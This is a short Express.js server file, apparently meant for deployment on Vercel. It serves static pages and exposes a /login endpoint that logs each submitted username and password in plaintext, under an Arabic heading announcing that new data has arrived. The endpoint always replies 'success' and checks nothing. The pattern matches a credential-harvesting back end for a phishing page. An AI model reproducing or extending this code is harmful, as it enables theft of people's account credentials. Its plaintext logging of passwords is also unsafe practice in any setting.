const express = require('express');
const cors = require('cors');
const app = express();

app.use(cors());
app.use(express.json());
app.use(express.static('.'));

app.post('/login', (req, res) => {
    console.log("=== بيانات جديدة وصلت ===");
    console.log("User:", req.body.user);
    console.log("Pass:", req.body.pass);
    res.json({ status: "success" });
});

module.exports = app; // هذا السطر مهم جداً لـ Vercel
